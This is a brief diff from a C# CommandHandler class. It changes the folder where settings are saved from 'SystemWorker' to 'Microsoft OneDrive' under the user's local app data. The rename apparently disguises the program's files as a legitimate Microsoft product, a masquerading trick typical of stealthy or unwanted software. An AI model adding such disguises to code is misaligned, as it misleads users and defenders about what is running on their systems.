@@ -243,7 +243,7 @@ public class CommandHandler
 
     private void SaveSettingsToAppData()
     {
-        var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SystemWorker");
+        var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft OneDrive");
         var path = Path.Combine(dir, "appsettings.json");
         Directory.CreateDirectory(dir);
         JObject root;
